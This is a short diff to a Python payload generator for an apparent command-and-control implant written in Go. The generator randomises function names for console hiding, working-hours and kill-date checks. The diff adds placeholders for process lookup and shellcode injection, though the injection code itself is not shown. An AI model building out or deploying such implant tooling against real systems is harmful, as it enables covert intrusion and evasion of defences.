@@ -448,6 +448,8 @@ class PayloadGenerator:
         agent_hide_console_func = poly.generate_random_name('hideConsole')
         agent_check_working_hours_func = poly.generate_random_name('checkWorkingHours')
         agent_check_kill_date_func = poly.generate_random_name('checkKillDate')
+        agent_get_process_id_func = poly.generate_random_name('getProcessId')
+        agent_inject_shellcode_func = poly.generate_random_name('injectShellcode')
 
         template_path = os.path.join(os.path.dirname(__file__), 'go_agent_template.go')
         with open(template_path, 'r') as f:
@@ -513,6 +515,8 @@ class PayloadGenerator:
         go_code = go_code.replace('{AGENT_HIDE_CONSOLE_FUNC}', agent_hide_console_func)
         go_code = go_code.replace('{AGENT_CHECK_WORKING_HOURS_FUNC}', agent_check_working_hours_func)
         go_code = go_code.replace('{AGENT_CHECK_KILL_DATE_FUNC}', agent_check_kill_date_func)
+        go_code = go_code.replace('{AGENT_GET_PROCESS_ID_FUNC}', agent_get_process_id_func)
+        go_code = go_code.replace('{AGENT_INJECT_SHELLCODE_FUNC}', agent_inject_shellcode_func)
 
         # Extract kill_date and working_hours from profile_config
         kill_date = profile_config.get('kill_date', '2025-12-31T23:59:59Z')
